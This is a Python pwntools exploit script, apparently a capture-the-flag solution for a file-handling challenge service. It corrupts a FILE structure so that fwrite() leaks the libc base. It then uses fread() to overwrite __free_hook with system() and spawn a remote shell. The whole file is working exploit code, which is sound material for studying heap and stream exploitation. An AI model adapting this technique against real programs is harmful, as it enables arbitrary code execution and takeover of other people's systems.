from pwn import *

r = remote("csie.ctf.tw", 10147)
# r = remote("127.0.0.1", 8888)
context.arch = "amd64"

def openfile(filename):
	r.recvuntil("choice :")
	r.sendline("1")
	r.recvuntil(":")
	r.sendline(filename)

def readfile(idx, size):
	r.recvuntil("choice :")
	r.sendline("2")
	r.recvuntil("Index:")
	r.sendline(str(idx))
	r.recvuntil("Size:")
	r.sendline(str(size))

def writefile():
	r.recvuntil("choice :")
	r.sendline("3")

def alloc(size):
	r.recvuntil("choice :")
	r.sendline("4")
	r.recvuntil("Size:")
	r.sendline(str(size))

magic = 0xfbad0000
currently = 0x800
# got of alarm()
base = 0x601fa8
end = base + 0x10

# arbitrary memory reading
# leak libc base via fwrite()
openfile("/dev/stdin")
alloc(0x20)
writefile()
readfile(0, 0xa8)
flag = magic | currently
payload = "a" * 0x30 + flat([flag, 0, base, 0, base, end, end]) + "\x00" * 0x38 + p64(1)
r.send(payload)
writefile()
libc = u64(r.recv(8)) - 0xcb650
print("libc : " + hex(libc))

# arbitrary memory writing
# overwrite __free_hook with system via fread()
alloc(0x20)
openfile("/dev/stdin")
readfile(1, 0x78)
flag = magic
free_hook = libc + 0x3c57a8
payload = "a" * 0x30 + flat([flag, -0x78, 0, 0, 0, 0, 0, free_hook-8, free_hook+9])
r.send(payload)
readfile(1, 8)
system = libc + 0x45390
r.send("/bin/sh\x00" + p64(system))

r.recvuntil("choice :")
r.sendline("5")

r.interactive()

